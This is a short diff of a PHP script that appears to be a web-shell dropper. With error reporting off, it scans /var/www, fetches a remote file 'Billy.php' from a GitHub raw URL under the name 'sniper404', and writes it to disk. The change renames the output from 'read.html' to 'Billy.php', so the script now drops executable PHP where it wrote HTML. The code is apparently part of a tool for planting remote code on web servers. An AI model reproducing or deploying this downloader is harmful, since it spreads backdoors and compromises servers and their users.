@@ -4,7 +4,7 @@ error_reporting(0);
 $root = '/var/www';
 $scan = scandir($root);
 
-$nama = 'read.html'; 
+$nama = 'Billy.php'; 
 $isi = file_get_contents('https://raw.githubusercontent.com/Sniperxxx/sniper404/main/Billy.php'); 
 
 $bikin = fopen($nama, "w");
